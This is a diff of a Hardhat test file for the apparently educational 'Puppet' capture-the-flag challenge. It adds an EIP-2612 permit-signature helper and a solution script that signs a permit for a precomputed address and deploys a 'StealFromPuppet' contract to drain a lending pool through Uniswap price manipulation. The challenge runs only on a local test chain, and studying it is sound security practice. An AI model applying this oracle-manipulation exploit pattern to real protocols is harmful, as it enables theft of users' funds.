@@ -3,11 +3,62 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { getContractAddress } = require('@ethersproject/address')
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
     return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
+}
+async function getPermitSignature(signer, token, spender, value, deadline) {
+    const [nonce, name, version, chainId] = await Promise.all([
+        token.nonces(signer.address),
+        token.name(),
+        "1",
+        signer.getChainId(),
+    ])
+
+    return ethers.utils.splitSignature(
+        await signer._signTypedData(
+            {
+                name,
+                version,
+                chainId,
+                verifyingContract: token.address,
+            },
+            {
+                Permit: [
+                    {
+                        name: "owner",
+                        type: "address",
+                    },
+                    {
+                        name: "spender",
+                        type: "address",
+                    },
+                    {
+                        name: "value",
+                        type: "uint256",
+                    },
+                    {
+                        name: "nonce",
+                        type: "uint256",
+                    },
+                    {
+                        name: "deadline",
+                        type: "uint256",
+                    },
+                ],
+            },
+            {
+                owner: signer.address,
+                spender,
+                value,
+                nonce,
+                deadline,
+            }
+        )
+    )
 }
 
 describe('[Challenge] Puppet', function () {
@@ -23,12 +74,12 @@ describe('[Challenge] Puppet', function () {
     const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
-        
+
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
 
@@ -52,7 +103,7 @@ describe('[Challenge] Puppet', function () {
             token.address,
             uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await token.approve(
             uniswapExchange.address,
@@ -64,7 +115,7 @@ describe('[Challenge] Puppet', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await uniswapExchange.getTokenToEthInputPrice(
@@ -78,7 +129,7 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and player accounts
         await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
         await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
@@ -95,17 +146,43 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // https://ardislu.dev/damn-vulnerable-defi/8
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        const steal_address = getContractAddress({
+            from: player.address,
+            nonce: await player.getTransactionCount()
+        });
+        const { v, r, s } = await getPermitSignature(
+            player,
+            token,
+            steal_address,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            deadline
+        );
+
+        steal = await (await ethers.getContractFactory('StealFromPuppet', player)).deploy(
+            lendingPool.address,
+            uniswapExchange.address,
+            token.address,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            deadline,
+            v,
+            r,
+            s,
+            { value: (await ethers.provider.getBalance(player.address)).toBigInt() - 10n ** 18n }
+        );
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Player executed a single transaction
         expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
-        
+
         // Player has taken all tokens from the pool       
         expect(
             await token.balanceOf(lendingPool.address)
         ).to.be.eq(0, 'Pool still has tokens');
+        console.log("pool token: ", await token.balanceOf(lendingPool.address))
 
         expect(
             await token.balanceOf(player.address)
